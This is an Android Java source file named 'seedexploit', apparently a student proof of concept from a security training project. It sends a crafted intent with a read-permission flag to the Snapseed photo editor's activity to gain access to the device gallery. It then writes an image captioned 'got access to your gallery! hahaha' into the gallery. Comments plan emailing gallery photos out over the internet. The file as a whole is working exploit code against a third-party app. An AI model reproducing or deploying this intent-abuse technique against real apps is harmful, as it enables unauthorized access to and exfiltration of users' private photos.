package com.ufam.edu.br.seedexploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;

public class MainActivity extends AppCompatActivity
{
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        Log.d("Wow", "ENTROU NO onCreate... ");

        //modificar o Intent para pegar info do wallpaper
        Intent intent = new Intent("android.intent.action.SEND", MediaStore.Images.Media.EXTERNAL_CONTENT_URI);

        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        intent.setClassName("com.niksoftware.snapseed", "com.google.android.apps.snapseed.activities.edit.MainActivity");
        intent.putExtra("android.intent.extra.STREAM", "wow");

        startActivityForResult(intent, 0);

    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        super.onActivityResult(requestCode, resultCode, data);

        String uri = MediaStore.Images.Media.insertImage(getContentResolver(),
                     Bitmap.createBitmap(100, 100, Bitmap.Config.ARGB_8888),
                     "DEV_TITANS",
                      "consegui_acesso a sua galeria! hahaha");

        Log.d("Wow", "ENTROU NO onActivityResult! ");

        // acessa internet e fazer algo que tu consiga ver( visual) recebeer um email com a foto da galeria. (1)
        // verificar o porque de no emulador nao escrever na galeria ? (2)
        Log.d("Wow", "RESULT:  " + uri);
        Log.d("Wow", "Data: " + data.getData());
        Log.d("Wow", "Flags: " + data.getFlags());

    }


}